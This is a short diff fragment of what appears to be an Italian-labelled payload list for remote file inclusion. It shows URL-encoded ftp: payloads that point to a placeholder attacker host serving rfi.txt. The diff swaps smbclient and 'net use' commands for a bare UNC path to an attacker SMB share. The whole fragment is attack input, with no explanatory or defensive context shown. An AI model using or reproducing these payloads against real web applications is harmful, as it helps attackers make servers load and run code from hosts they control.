@@ -77,10 +77,8 @@ ftp:%2f/%2FATTACKER-IP>%2frfi.txt
 ftp:%252f%252f<ATTACKER-IP>%252frfi.txt
 
 == Attivazione RFI via SMB
-smbclient //<ATTACKER-IP>/share -N
-smbclient+//<ATTACKER-IP>/share+-N
-net use \\<ATTACKER-IP>\share
-net+use+\\<ATTACKER-IP>\share
+\\<ATTACKER-IP>\share
+
 
 
 
